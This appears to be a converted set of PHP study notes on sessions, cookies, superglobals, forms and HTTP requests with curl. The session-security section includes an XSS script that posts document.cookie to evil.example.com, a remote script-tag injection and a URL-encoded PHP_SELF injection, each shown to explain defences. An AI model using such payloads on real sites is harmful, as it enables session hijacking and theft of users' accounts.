---
id: index
title: DDD
---

<!----- Conversion time: 9.385 seconds.


Using this Markdown file:

1. Cut and paste this output into your source file.
2. See the notes and action items below regarding this conversion run.
3. Check the rendered output (headings, lists, code blocks, tables) for proper
   formatting and use a linkchecker before you publish this page.

Conversion notes:

* Docs to Markdown version 1.0β14
* Sun Feb 10 2019 08:40:46 GMT-0800 (PST)
* Source doc: https://docs.google.com/open?id=1YhAYn2-xaqIPk7NXilOghJrxQ0KxZf7zwK75Tb1iQA4

WARNING:
You have 2 H1 headings. You may want to use the "H1 -> H2" option to demote all headings by one level.

----->


# Sessions

A session is a magic array which persists across page loads and holds user-specific data. Misusing session leads to substantial security holes, performance and scalability problems, and data corruptions.

*   Session support enabled by default
*   Configuration options set in php.ini
*   SID (string) Is a predefined constant within this extension


## Visitor counting app


```php
session_start();

if(!isset($_SESSION['counter'])) {
   $_SESSION['counter'] = 0;
}

$_SESSION['counter']++;

echo $_SESSION['counter'];
```


Each time you refresh the page, the number picks up where it left off. If you open this script on two different computers, they each have their own separate counter. What is going on? How is each computer being identified? Where is the counter variable being stored?

Sessions are uniquely defined by an ID. This session ID is stored on the user's computer in a cookie and passed back to the server on every request. The actual data (the counter variable) is stored on the server and indexed by session ID.


### SESSION ID

*   User assigned unique ID
*   SESSION ID is stored in a cookie on the client OR in the URL
*   Site access by user triggers session ID check through one of these mechanisms:
    *   Automatically - IF session.auto_start = 2
    *   UPON request - Using session_start()
*   $_SESSION available as Global variable
*   Enable **session.use_only_cookie** to Enforce cookie usage (and prevent session id in the URL)

session_start()	- 	Initialize session data

session_destroy()	-	destroy all data registered to a session

session_id()		- 	Get/Set current session ID

Warning: register_global feature has been DEPRECATED as of PHP 5.3.0 and REMOVED as of PHP 5.4.0

Sessions are like a gift card. Each card is kept by the user and has a unique ID. The actual data (the amount remaining) is held in a central database. If someone steals your gift card and tries to use it at a store, it is accepted without question. The store only sees the ID on the card and has no idea who it belongs to. 

Sessions behave the same way. If an attacker steals your session ID, they can impersonate you without the server being able to tell the difference. This is called session hijacking and has been a significant security problem for over a decade.


## Securing PHP Sessions

There are four main ways an attacker can steal a user's PHP session ID.

Session Fixation, Sidejacking, Cross-Site Scripting Attack, and Malware


### Session Fixation

An attacker visits your site and gets a session ID assigned to him. Let's say he get ID 12345.  If the attacker can find some way to trick a user into setting a session cooking with same ID, the attacker can effectively taken over the user's account.

Starting with PHP version 4.3, Session ID can be pass via the URL. This is an easy way for an attacker to force a session ID on a User. All the attacker has to do is get the user to click on a link containing ?SID=12345. PHP 5.3 checked the default to disable this insecure feature.

Protection method, ensure the following settings in php.ini



1.  Use Cookie 2. Use session strict mode

```bash
session.use_cookies = 1
session.use_only_cookies = 1
session.use_trans_sid = 0
```

Protecting against sidejacking and Cross-Site Scripting will effectively prevent session fixation attack as well.

Another use case: Let's say you're logged in - and you have this url: _http://mysite.com/admin.php?SID=abc123_ - and you're doing your admin work. Then, you go to the about page of the site - and realize you want to share that link with your friend: _http://mysite.com/about.php?SID=abc123_ This means you've basically given your friend the token to your session. Once they load that, they could - depending on the security of your app - act as you.


#### Use Session Strict Mode

So, now imagine you didn't do the above setting - and instead - you allow session IDs in URLs. This is bad because PHP can allow you to set your own session ID if it doesn't already exist. For example, let's say that Bob wants to hack Sue, an administrator. He sends her to this specially crafted link: http://mysite.com/about.php?SID=abc123

PHP doesn't have that session yet, so it starts a session with that ID. Well, later, Sue logs in and does some admin type stuff. Bob still knows the session ID - and now can use that in his browser to overtake her session. (aside: you should also regenerate your session IDs when you change access levels… so this wouldn't matter there…)

Now, if we set it to use cookies only, it's still not impossible - just harder (Bob needs to find a way to set a cookie in Sue's browser with a known value.)

PHP has this setting available since 5.5.2 called strict mode. With this activated, if a session is requested with a ID that does not exist, PHP will generate a new ID instead of creating a session with that ID.

In the php.ini file


```
session.use_strict_mode = 1
```

### Sidejacking

Similar to man-in-middle attack, the attacker intercepts communication between user and the server (usually on a public WIFI network), Instead of messing with the request, sidejacking passively listens and records data. Cookies are passed as plaintext as an HTTP header, so it's trivial to attacker to steal session IDs.

But what about https? Doen't it solve by encrypting traffic? Yes and no. with a proper HTTPS setup, we can ensure all traffic between you and the use is encrypted with one major caveat. You can't control what the use types into the address bar. Let's say a user has previously been to your site https:// example.com and has a session established. They are on a public Wi-Fi hotspot and type "example.com" in their address bar. The browser sends a request to http:// example.com and is returned a 301 redirect to the secure version of the site. Everything looks good to the user, but the damage has already been done. The initial request was unencrypted and contained all cookies, including the session ID. That's all an attacker needs to impersonate the user and take over their account. 

PHP has a simple setting which effectively eliminates this threat. The **session.cookie_secure **flag in php.ini (which defaults to off) makes sure modern browsers will never send the session cookie in unencrypted requests and keeps your users safe.


## Cross Site Scripting (XSS)

Unfortunately, even with HTTPs and secure cookies, your site still may be susceptible to session hijacking. Thirst method is XSS. Let's say you forget to sanitize a GET variable before outputting: **<em><?php echo $_GET['search_term'];?>**

An attacker can now inject arbitrary HTML and JS into your page. Normally 3rd party Js doesn't have access to your site's cookies due to cross-origin policies in the web browsers. But when the Js is injected directly into your servers HTTP response, the browsers assumes it is authentic and gives full access to cookies. All an attacker needs to do is get someone to click on a link which outputs the following code.**< script > $. post( "https:// evil.example.com/ attack.php", {cookies: document.cookie} ) </ script >**

This simple script will send all of a user's cookies (including the session ID) to the attackers website. Luckily, browsers have mostly solved this with the **HttpOnly **setting for cookies. This settings makes a cookie unaccessible from JS. The cookie value is still passed in every request, but **document.cookie **and **XMLHttpRequest **do not have access to it. And it works in virtually all browsers released after IE6! All you need to do is enable the php.ini setting **session.cookie_httponly**

Session hijacking is just one way attackers can use XSS. Attackers can make unauthorized POST requests to your server to do things like changing an email address, making a purchase, or stealing personal information. Even if your cookies are protected with HttpOnly, it's still extremely important to prevent HTML injection vulnerabilities. Chrome and Safari have an XSS Auditor which prevents common injection attacks, but new workarounds and bypasses are continually being discovered. 

The most sensitive websites can enable a Content Security Policy (CSP). The default behavior with a CSP is to block all inline JavaScript and styles on your site. An attacker can still exploit an XSS with remote JavaScript (< script src =" https:// evil.example.com/ attack.js" > </ script >). A CSP also allows you to create a whitelist of allowed domains. If evil.example.com is not on this list, the browser will block any requests to it. [Content Security Policies](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) are complicated to setup and maintain for most sites, but is an option for those which require the highest levels of security. Check out Content Security Policy for more info. 

Above all, the best defense against XSS is always to sanitize user input! If there are no HTML injection vulnerabilities on your site, you have nothing to worry about. Or do you?


### Malware

The last method for session hijacking is a little different. Using any number of vectors, an attacker installs malware or gains physical access to a user's computer. Then, the attacker can copy the session ID directly from the filesystem or memory. You can't prevent your users from installing malware on their computers, but there are some measures you can take to protect their accounts. Require users to re-authenticate before making significant changes or buying something. Email users a notice when their account data changes. Require two-factor authentication. Have a short expiration time for sessions and limit your use of "remember me" cookies. 

Re-authenticating at critical flows in your application should be required. There are PHP libraries for integrating with two-factor authentication apps like Google Authenticator. But, these security measures aren't free and can require substantial development time to implement correctly. How many layers you add depends on how paranoid you want to be and the nature of your site. An online bank should probably implement all of these measures. A small informational website might choose to have none of them.

  

[http://phpsecurity.readthedocs.io/en/latest/Cross-Site-Scripting-(XSS).html](http://phpsecurity.readthedocs.io/en/latest/Cross-Site-Scripting-(XSS).html)

The **session.use_trans_sid** PHP directive allows a user to choose dynamically whether to propagate the session identifier via cookies or the URL, depending on the user's preferences. If you have enabled cookies, PHP will use a cookie; otherwise, it will use the URL.

The** session.auto_start()** PHP directive indicates whether or not PHP should always enable session management, allowing you to avoid the call to session_start().

The **session.use_cookies** directive indicates whether or not PHP will use cookies to propagate the session identifier.

The **session.save_path** directive indicates the directory in which PHP will store session data.


## SERVER


###### Get client IP address


```php
//whether ip is from share internet 
if (! empty($_SERVER['HTTP_CLIENT_IP']))
{
   $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
}
//whether ip is from proxy 
elseif (! empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
   $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
//whether ip is from remote address 
else
{
   $ipAddress = $_SERVER['REMOTE_ADDR'];
}

echo $ipAddress;
```



###### Browser detection


```
echo "Your User Agent is :" . $_SERVER ['HTTP_USER_AGENT'];
```



###### Whether the page is called from https or http


```
if (! empty($_SERVER['HTTPS'])) {
   echo "https enabled";
```



######  Get the full URL

$full_url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";


### HTTP_REFERER

When a web browser moves from one website to another and between pages of a website, it can optionally pass the URL it came from. This is called the HTTP_REFERER.


```
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
```



### PHP_SELF

This is returns the current script being executed. It returns the name and path of the current file (from the root folder).



*   Can be used in the action field of the form.

```
echo $_SERVER['PHP_SELF'];
```



What are PHP_SELF exploits and how to avoid them

The PHP_SELF variable is used to get the name and path of the current file but it can be used by the hackers too. If PHP_SELF is used in your page then a user can enter a slash (/) and then some Cross Site Scripting (XSS) commands to execute.

See below for an example:

<form name="test" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">

Now, if a user has entered the normal URL in the address bar like

http://www.yourdomain.com/form-action.php

the above code will be translated as:

<form name="test" action="form-action.php" method="post">

This is the normal case.

Now consider that the user has called this script by entering the following URL in the browser's address bar:

http://www.yourdomain.com/form-action.php/%22%3E%3Cscript%3Ealert('xss')%3C

/script%3E%3Cfoo%22

In this case, after PHP processing the code becomes:

<form name="test" method="post" action="form-action.php"/>

<script>alert('xss')</script><foo"">

You can see that this code has added a script tag and an alert command. When this page is be loaded, user will see an alert box. This is just a simple example how the PHP_SELF variable can be exploited.

Any JavaScript code can be added between the "script" tag. <script>....HERE....</script>. A hacker can link to a JavaScript file that may be located on another server. That JavaScript file can hold the malicious code that can alter the global variables and can also submit the form to another address to capture the user data, for example.

How to Avoid the PHP_SELF exploits

PHP_SELF exploits can be avoided by using the htmlentities() function. For example, the form code should be like this to avoid the PHP_SELF exploits:

<form name="test" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post">

The htmlentities() function encodes the HTML entities. Now if the user tries to exploit the PHP_SELF variable, the attempt will fail and the result of entering malicious code in URL will result in the following output:

<form name="test" method="post"

action="form-action.php/&quot;&gt;&lt;script&gt;alert('xss')&

lt;/script&gt;&lt;foo">

As you can see, the script part is now 'sanitized'.

So don't forget to convert every occurrence of "$_SERVER['PHP_SELF']" into "htmlentities($_SERVER['PHP_SELF'])" throughout your script.

NOTE:

Some PHP servers are configured to solve this issue and they automatically do this conversion.But, why take risk? make it a habit to use htmlentities() with PHP_SELF.


## Forms


## Get and Post data



*   POST allows the client to send along a data payload, While GET only allows you to send data as part of the URL query string. 
*   When a form submitted using GET, the form values are encoded directly in the query string portion of the URL. 
    *   ?list=user&orderby=name&direction=asc
    *   ?list=user&order[by]=column&order[dir]=asc

    	echo $_GET['list'];  


    echo $_GET['order']['by'];  


        echo $_GET['order']['dir'];


    [http://www.zendexam.com/question/278/consider-the-following-php-code-snippetwhat-will-be-the-output-if-you-select--orange--from-the-dropdown-menu/](http://www.zendexam.com/question/278/consider-the-following-php-code-snippetwhat-will-be-the-output-if-you-select--orange--from-the-dropdown-menu/)

*   Browsers has limitation in the Size and type of data you could send using GET.

    Ex: FILE uploads required POST.

*   a POST transaction indicates that you intend to modify data (i.e., you are sending information over to the server). A GET transaction, on the other hand, indicates that you intend to retrieve data.


### FORM ELEMENTS

FORM DATA AUTOMATICALLY AVAILABLE TO PHP SCRIPTS

DOTS AND SPACES IN VARIABLE NAMES CONVERTED TO UNDERSCORES

	Ex: FORM FIELD "foo.x" BECOMES $_GET["foo_x"] OR $_POST["foo_x"]

FORM DATA CAN BE MADE INTO AN ARRAY USING THE FOLLOWING SYNTAX <input name="FormArray[]" />

	GROUP ELEMENTS BY ASSIGNING THE SAME ARRAY NAME TO DIFFERENT ELEMENTS; CAN SPECIFY KEYS


## SUPERGLOBAL ARRAYS

Superglobal variables are built in arrays in PHP, which are available in any scope. A user can access a superglobal array within a function or method without using the global keyword. 

$_COOKIE	It contains keys and values set as browser cookies.

$_ENV		It contains keys and values set by the script's shell context.

$_FILES	It contains information about uploaded files.

$_GET		It contains keys and values submitted to the script using the HTTP get method.

$_POST		It contains keys and values submitted to the script using the HTTP post method.

$_REQUEST	It contains a combined array containing values from the $_GET, $_POST, and $_COOKIE superglobal arrays.

$GLOBALS	It contains all global variables associated with the current script.


#### $_POST SUPERGLOBAL 

contains all POST data; PAIRED WITH POST METHOD

The $_POST array won't always contain your POST data and can be easily found empty.

$.ajax({ \
    url: 'http://my.site/some/path', \
    method: 'post', \
    data: JSON.stringify({a: 'a', b: 'b'}), \
    **contentType: 'application/json' \
**}); \


We send data as JSON, which is quite popular for APIs. It's the default.

var_dump($_POST); Surprisingly, the result will be: empty array. why? what happened to our JSON string {a: 'a', b: 'b'}?

The answer is that _PHP only parses a POST payload automatically when it has a content type of_ application/x-www-form-urlencoded _or_ multipart/form-data. The reasons for this are historical — these two content types were essentially the only ones used years ago when PHP's $_POST was implemented. So with any other content type (even those that are quite popular today, like application/json), PHP doesn't automatically load the POST payload.

Since $_POST is a superglobal, if we override it _once_ (preferably early in our script), the modified value (i.e., including the POST payload) will then be referenceable throughout our code. This is important since $_POST is commonly used by PHP frameworks and almost all custom scripts to extract and transform request data.

So, for example, when processing a POST payload with a content type of application/json, we need to manually parse the request contents (i.e., decode the JSON data) and override the $_POST variable, as follows:

 \
$_POST = json_decode(file_get_contents('php://input'), true); \


Then when we dump the $_POST array, we see that it correctly includes the POST payload; e.g.:

array(2) { ["a"]=> string(1) "a" ["b"]=> string(1) "b" } \


$_GET SUPERGLOBAL CONTAINS ALL GET DATA


###### $_REQUEST



*   IS INDEPENDENT OF DATA SOURCE ( to receive data from a Web page if you do not know how data is sent)
*   AND MERGES INFORMATION FROM GET, POST, AND COOKIES; ($_REQUEST only contains cookie, GET, and POST information)
*   USAGE IS NOT RECOMMENDED


## File uploads

<form enctype="multipart/form-data" action="index.php"  method="post">  

      <input type="hidden" name="**MAX_FILE_SIZE**"  value="50000" />  

      <input name="filedata" type="file" />  

      <input type="submit" value="Send file" />



*   Client side **MAX_FILE_SIZE** validation can be changed by the users.
*   MAX_FILE_SIZE is in **bytes**.
*   Post_max_size, max_input_time and upload_max_filesize.

What is the default enctype for form? 

application/x-www-form-urlencoded


#### $_FILES

Name		The original name of the file

type 		The MIME type of the file provided by the browser

Size		The size (in bytes) of the file

tmp_name 	The name of the file's temporary location

Error

The error code associated with this file. A value of **UPLOAD_ERR_OK** indicates a successful transfer, while any other error indicates that something went wrong (for example, the file was bigger than the maximum allowed size).


## Encoding / Decoding

Implement at key stages in form submission process


### Html interpretation

htmlspecialchars() 

**htmlentities** — Convert all applicable characters to HTML entities


### Url

urlencode()

used to encode a URL. It returns a string in which all non-alphanumeric characters are replaced with a percent (%) sign followed by two hex digits. However, it does not encode - (dash) and _ (hyphen) characters. It encodes spaces as plus (+) signs.


## Compression

If you want to enable compression for every Web page of your Website, you should change the following configuration directives in your php.ini file:



1.  zlib.output_compression = on
1.  zlib.output_compression_level = 9

Since you can change these settings and turn them on or off without changing your code, it is best way of implementing compression within your application.


## Cookies

Cookies are small text files placed on the client's computer /  Way of storing data in a browser to ID/ track a user.



*   create(Set) cookies with the setCookie() OR setrawcookie()
    *   Must be called before sending any output to browser
    *   Can delay script output using output buffering, To allow time to Decide to set cookies OR send Headers

bool setcookie ( string $name [, string $value = "" [, int $expire = 0 [, string $path = "" [,string $domain = "" [, bool $secure = false [, bool $httponly = false ]]]]]] )

Once the cookies have been set, they can be accessed on the next page load with the $_COOKIE array. Cookie values may also exist in $_REQUEST.

If output exists prior to calling this function, setcookie() will fail and return FALSE. If setcookie() successfully runs, it will return TRUE. This does not indicate whether the user accepted the cookie.

setcookie — Send a cookie

setrawcookie — Send a cookie without urlencoding the cookie value

	


#### setcookie() send example

$value = 'something from somewhere';

setcookie("TestCookie", $value); /* automatically expire at the end of user's browser session */

setcookie("TestCookie", $value, time()+3600);  /* expire in 1 hour */

setcookie("TestCookie", $value, time()+3600, "/~rasmus/", "example.com", 1);


#### setcookie() delete example

// set the expiration date to one hour ago

setcookie ("TestCookie", "", time() - 3600);

setcookie ("TestCookie", "", time() - 3600, "/~rasmus/", "example.com", 1);


#### setcookie() and arrays

// set the cookies

setcookie("cookie[three]", "cookiethree");

setcookie("cookie[two]", "cookietwo");

setcookie("cookie[one]", "cookieone");

// after the page reloads, print them out

if (isset($_COOKIE['cookie'])) {

    foreach ($_COOKIE['cookie'] as $name => $value) {

        $name = htmlspecialchars($name);

        $value = htmlspecialchars($value);

        echo "$name : $value <br />\n";

    }

}

By specifying the [HttpOnly flag](https://www.owasp.org/index.php/HttpOnly) when setting the session cookie you can tell a users browser not to expose the cookie to client side scripting such as JavaScript. This makes it harder for an attacker to hijack the session ID and masquerade as the effected user.

A helpful setting has been added to the PHP configuration to automate this process this for you.

session.cookie_httponly = 1 \


It is also a good idea to make sure that PHP only uses cookies for sessions and disallow session ID passing as a GET parameter:

session.use_only_cookies = 1 \


It is important to point out that HttpOnly, whilst useful as another layer in the onion of security is not going to protect a user from other forms of XSS attack. As previously mentioned on [GNUCitizen](http://www.gnucitizen.org/blog/why-httponly-wont-protect-you) session hijacking is often avoided by attackers as it requires getting and keeping a user in the right state in the target application. You must ensure that the rest of you application is not XSS vulnerable to prevent attackers utilising other vectors.

So it is just one very small step in making your PHP installation slightly more secure, but if you are not doing it then you are failing to exploit all the avenues available to you.

Another important way to increase the security of PHP sessions in your application is to install an [SSL certificate](http://php.net/manual/en/session.security.php) on the web server and force all user interactions to occur over HTTPS only. This will prevent the users session ID from being transmitted in plain text to make it much harder to hijack the users session.

In Https transaction, Urls and query strings passed from the browser to the web server are encrypted.

ensuring session cookies are only sent over secure connections (thank you to [Padraic for reminding me](http://www.reddit.com/r/PHP/comments/1eb232/improve_php_session_cookie_security/c9ykevt)):

session.cookie_secure = 1

The secure option is used when the cookie can be transferred only via the HTTPS protocol

Common Pitfalls:



*   Cookies will not become visible until the next loading of a page that the cookie should be visible for. To test if a cookie was successfully set, check for the cookie on a next loading page before the cookie expires. Expire time is set via the **expire** parameter. A nice way to debug the existence of cookies is by simply calling _print_r($_COOKIE);_.
*   Cookies must be deleted with the same parameters as they were set with. If the value argument is an empty string, or FALSE, and all other arguments match a previous call to setcookie, then the cookie with the specified name will be deleted from the remote client. This is internally achieved by setting value to 'deleted' and expiration time to one year in past.
*   Because setting a cookie with a value of FALSE will try to delete the cookie, you should not use boolean values. Instead, use _0_ for FALSE and _1_ for TRUE.
*   Cookies names can be set as array names and will be available to your PHP scripts as arrays but separate cookies are stored on the user's system. Consider [explode()](http://php.net/manual/en/function.explode.php) to set one cookie with multiple names and values. It is not recommended to use [serialize()](http://php.net/manual/en/function.serialize.php) for this purpose, because it can result in security holes.
*   implode () helps to store array in a cookie.

Multiple calls to setcookie() are performed in the order called.

[http://fabien.potencier.org/create-your-own-framework-on-top-of-the-symfony2-components-part-2.html](http://fabien.potencier.org/create-your-own-framework-on-top-of-the-symfony2-components-part-2.html)


# HTTP



*   HTTP stand for HyperText Transfer Protocol, is the basis upon which the web is built.
*   A transaction contains Request and Response

Note:  The part of the URL after the ? is the "query string" and it's one way of passing additional data to a particular URL or endpoint.


## HTTP Requests

[http://requestb.in](http://requestb.in)

[http://example.com/](http://example.com/)

[http://httpresponder.com](http://httpresponder.com)

[http://httpbin.org](http://httpbin.org)


### Using Command-line tools

curl is a command line tool which is used to transfer data over the internet. It began as a project by Daniel Stenberg to transfer data over HTTP but has now evolved into a very robust tool that transfers data not just over HTTP but also FTP, TELNET, IMAP, and many more.

To play with curl you can use **httpbin.org** which is an HTTP client testing service


#### GET request

**_curl [www.httpbin.org](www.httpbin.org) \
_**This command will fetch the HTML for the HTTPBin homepage. Notice that we've not mentioned the protocol or the HTTP method. They've defaulted to HTTP and GET, respectively.


#### HEAD request

Sometimes you may want to see just the headers that the server would return when it's issued a GET request. In such a case, we'd use the HEAD method. The head request is issued with -I (capital i) or --head. 


```
curl -I www.httpbin.org 
```



#### VERBOSE output

Sometimes, you may want to debug a problem because the curl command hasn't returned what it was supposed to or just hasn't worked at all. In such cases, you can use the verbose mode using -v or --verbose to get more output from curl. Let's modify the previous HTTP request to become verbose.


```
me@home:~$ curl -Iv www.httpbin.org
```


Now there's a lot more output in the terminal. Let's see what it means.



1.  Lines prefixed with an asterisk (*) show additional work curl has done. For example:

<code>* Rebuilt URL to: [www.httpbin.org/](www.httpbin.org/)   → </code>Shows that curl added a slash at the end of the URL.<code> \
*   Trying 23.22.14.18… </code>→ Shows that curl has resolved the URL to an IP address.<code> \
* Connected to www.httpbin.org (23.22.14.18) port 80 (#0) </code>→ Shows that curl has connected to the URL on port 80.

Lines prefixed with a greater-than (>) sign show the data curl has sent to the server. For example:


```
> HEAD / HTTP/1.1
> Host: www.httpbin.org
> User-Agent: curl/7.47.0
> Accept: */*
```


Lines prefixed with a less-than (<) sign show the data curl has received from the server. For example:


```
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: nginx
Server: nginx
```



#### MULTIPLE REQUESTS

You can also send requests to multiple URLs by separating them by space. Here's how:


```
me@home:~$ curl httpbin.org/status/418 httpbin.org/status/418
```


The above example will send two GET requests, both to the same URL, one after the other. You should see two little teapots printed in your terminal. 


#### POST REQUEST

You can send a POST request by using the -d (or --data) flag. It͛s up to you to properly URL encode the data or specify it as JSON. We'll see the examples for both of those. Here's how you'd send URL encoded data as a part of the POST body

me@home:~$ curl -d 'name=john+doe&course=linux' httpbin.org/post

The response sent by HTTPBin will simply echo what you͛ve sent.

To send JSON:

me@home:~$ curl -d '{"name":"John Doe","course":"Linux"}' httpbin.org/post

Notice that in both the examples, the data is enclosed in single quotes. Using double quotes is okay but it may cause problems if the body also contains double quotes like JSON. Using single quotes is the safer approach.


#### SETTING HEADERS

You can set headers by using the -H flag. In our previous example, we've sent JSON without setting the Content-Type header to application/json. Here's the previous example modified to set the header:

me@home:~$ curl -H 'Content-Type: application/json' -d '{"name":"John Doe","course":"Linux"}' httpbin.org/post

You set the header as a key-value pair consisting of the header name followed by a colon and the value.


#### POSTING FORM DATA

You can send form data by using the -F flag. Use this flag for every form field that you want to send. Here's how you'd send form data:

me@home:~$ curl -F "name=John Doe" -F "course=linux"  httpbin.org/post

Notice that we've written the name as John Doe without a plus sign in between. The response received will have the Content-Type header set to multipart/form-data.


#### UPLOADING FILES

Using curl, you can upload files both as a part of a form field or to a ReST API endpoint. We'll first create a file and then upload it both as a part of a form and to a ReST endpoint.

me@home:~$ echo "hello, world" >> file.txt      \
me@home:~$ curl -F "file=@file.txt" httpbin.org/post

Since we're using the -F flag, the file is uploaded as a part of the form. You specify the file to upload by an @ followed by the path to the file. Since our file is in the current directory, we just specify the file name.

Uploading to a ReST endpoint is similar. We just use the -d flag instead.

me@home:~$ curl -d @file.txt httpbin.org/post

Notice now that there are no quotes around file.txt. This is because we want the contents of the file to be the body of the POST request and not string "@file.txt" itself.


#### PUT REQUEST

ReST APIs use the PUT request to update an existing resource that the server manages. Making a PUT request with curl is similar to making a POST request. Here's how you'd make a PUT request: 

me@home:~$ curl -X PUT -d '{"name":"Jane Doe"}' httpbin.org/put


#### DELETE REQUEST

Similarly, ReST APIs use DELETE request to delete an existing resource. Here's how to make a delete request:

me@home:~$ curl -X DELETE httpbin.org/delete


#### BASIC AUTHENTICATION

Curl includes support for basic authentication. With basic authentication, you send your username and password as a part of the URL. There's a two ways in which you can do this in curl. Here's how:

me@home:~$ curl -u john:abc123 httpbin.org/basic-auth/john/abc123 \
me@home:~$ curl john:abc123@httpbin.org/basic-auth/john/abc123

In the first one you specify the username and password using the -u (short for --user) flag and curl appends this to the URL you provide. In the second case, you do it manually. Basic authentication does not encrypt your credentials in any way and is thus insecure unless used with HTTPS.


#### SETTING COOKIES

You can set cookies using the -b (short for --cookie) flag. You specify the key and the value for the cookie with the flag. Here͛s an example showing how to set two cookies:

me@home:~$ curl --cookie "name=john;course=linux beginner" httpbin.org/cookies

Notice that cookies are separated by a semicolon and that you do not need to encode spaces as a plus sign.This brings us to the end of the guide on using curl. The next part of the guide will introduce you to HTTP headers.


## HTTP HEADERS

The HTTP protocol allows a client to send a request to a server. With every HTTP request and response, there are associated headers that provide some more information. Let's make a HEAD request and see what we get:

me@home:~$ curl -Iv httpbin.org/get      \
*   Trying 23.22.14.18... \
* Connected to httpbin.org (23.22.14.18) port 80 (#0) \
> HEAD /get HTTP/1.1 \
> Host: httpbin.org> User-Agent: curl/7.49.1 \
> Accept: */* \
>  \
< HTTP/1.1 200 OKHTTP/1.1 200 OK \
< Server: nginxServer: nginx \
< Date: Wed, 14 Dec 2016 16:23:11 GMTDate: Wed, 14 Dec 2016 16:23:11 GMT \
< Content-Type: application/json \
Content-Type: application/json \
< Content-Length: 186 \
Content-Length: 186 \
< Connection: keep-alive \
Connection: keep-alive \
< Access-Control-Allow-Origin: * \
Access-Control-Allow-Origin: * \
< Access-Control-Allow-Credentials: true \
Access-Control-Allow-Credentials: true

In the output that's printed, the following are headers: Host, User-Agent, Accept, Server, Content-Type, Content-Length, Connection, Access-Control-Allow-Origin, and Access-Control-Allow-Credentials.

Headers can be classified as request and response headers that contain information about the request and response, respectively, or as general headers that contain information about both request and response. There's also another class of headers known as entity headers that contain more information about an entity, such as a file (i.e. it's length and MIME-type). Here's some of the most common headers and what they mean.


### REQUEST HEADERS


### REQUEST HEADERS


#### AUTHORIZATION HEADER

The Authorization header is used to provide authentication information such as bearer tokens.The server then uses this information to find out if the request should be processed further or not, depending on the validity of the authentication information provided. Example:

Authorization: Bearer 3beca038a248ff027d0445342fe285


#### CACHE-CONTROL HEADER

The Cache-Control header decides how long applications, such as the browser, can keep a local copy of the data. This helps improve the efficiency since it helps avoid a round-trip to the server. Cache-Control has various directives that control various aspects of caching, such as the length of time data may be cached or if it shouldn't be cached at all. Example:

Cache-Control: max-age=100


#### EXPIRES HEADER

The Expires header is also used for caching and specifies the date and time after which a particular cached resource is considered stale. When both Expires and Cache-Control header are set, the Cache-Control header takes higher priority. Example:

Expires: Wed, 21 Oct 2015 07:28:00 GMT


#### CONNECTION HEADER

The Connection header specifies whether a connection should last for the duration of the request or if it should stay open, allowing it to be reused for subsequent requests. The default value is "close" which creates a connection that only lasts for the duration of the request. Setting the header to "keep-alive" allows it to be persistent. Example:

Connection: keep-alive


#### ACCEPT HEADER

The Accept header tells the server what kind of content the client is expecting in the response. The value of this header is the MIME type of the content. Example: **Accept: application/json**


#### COOKIE HEADER

The cookie header contains all the cookies and their values. Cookies are used to identify the users, maintain sessions, and so on. Example:

Cookie: name=John;course=Linux


#### CONTENT-LENGTH HEADER

The Content-Length header specifies the length of the content in bytes. Example:

Content-Length: 111020


#### CONTENT-TYPE HEADER

The Content-Type header tells the client the MIME-type of the content that it has received. Example:


```
Content-Type: application/json

```



*   Example: curl [http://requestb.in/example](http://requestb.in/example)
*   Making POST request: curl **-X** POST [http://requestb.in/example](http://requestb.in/example)
*   For more detailed information curl **-v** -X POST [http://requestb.in/example](http://requestb.in/example) -d name="Rilwan" -d email="dsas"

[http://httpie.org](http://httpie.org)

[http://requestb.in](http://requestb.in)


## Using browser tools


## Using PHP itself



1.  Via cURL extension

<table>
  <tr>
   <td>
// A simple GET request
<p>
$url = "http://www.lornajane.net/";
<p>
$ch = curl_init($url);
<p>
curl_setopt($ch, <em>CURLOPT_RETURNTRANSFER</em>, <strong>true</strong>);
<p>
$result = curl_exec($ch);
<p>
curl_close($ch);
   </td>
   <td>// A simple GET request with data
<p>
$data = ["category" => "technology", "rows" => 20];
<p>
$get_addr = $url . '?' . http_build_query($data);
<p>
$ch = curl_init($get_addr);
<p>
curl_setopt($ch, <em>CURLOPT_RETURNTRANSFER</em>, 1);
<p>
echo curl_exec($ch);
   </td>
  </tr>
  <tr>
   <td>sends some JSON data and a Content-Type header with the POST request
<p>
$url = "http://requestb.in/example";
<p>
$data = ["name" => "Lorna", "email" => "lorna@example.com"];
<p>
$ch = curl_init($url);
<p>
curl_setopt($ch, <em>CURLOPT_POST</em>, 1);
<p>
curl_setopt($ch, <em>CURLOPT_POSTFIELDS</em>, json_encode($data));
<p>
curl_setopt($ch, CURLOPT_HTTPHEADER,
<p>
   ['Content-Type: application/json']
<p>
);
<p>
curl_setopt($ch, <em>CURLOPT_RETURNTRANSFER</em>, <strong>true</strong>);
<p>
$result = curl_exec($ch);
<p>
curl_close($ch);
   </td>
   <td>
   </td>
  </tr>
</table>




*   the CURLOPT_RETURNTRANSFER option to true , which causes cURL to return the results of the HTTP request rather than output them. 
1.  Built in stream-handling

[http://bit.ly/php-allow_url_fopen](http://bit.ly/php-allow_url_fopen)

if _allow_url_fopen_ is enabled, it is possible to make requests using file_get_contents() .

PHP can handle a variety of different protocols (HTTP, FTP, SSL, and more) and files using streams.


<table>
  <tr>
   <td>GET request and reading the response body
<p>
$result = file_get_contents("http://www.lornajane.net/");
   </td>
   <td>GET request with data
<p>
$url = 'http://localhost/book/get-form-page.php';
<p>
$data = ["category" => "technology", "rows" => 20];
<p>
$get_addr = $url . '?' . http_build_query($data);
<p>
<strong>echo </strong>file_get_contents($get_addr);
   </td>
  </tr>
  <tr>
   <td>POST request with  JSON data and headers.
<p>
$url = "http://requestb.in/example";
<p>
$data = ["name" => "Lorna", "email" => "lorna@example.com"];
<p>
$context = stream_context_create([
<p>
   'http' => [
<p>
       'method' => 'POST',
<p>
       'header' => [
<p>
           'Accept: application/json',
<p>
           'Content-Type: application/json',
<p>
           'content' => json_encode($data) ]]]);
<p>
file_get_contents($url, <strong>false</strong>, $context);
   </td>
   <td>POST form DATA
<p>
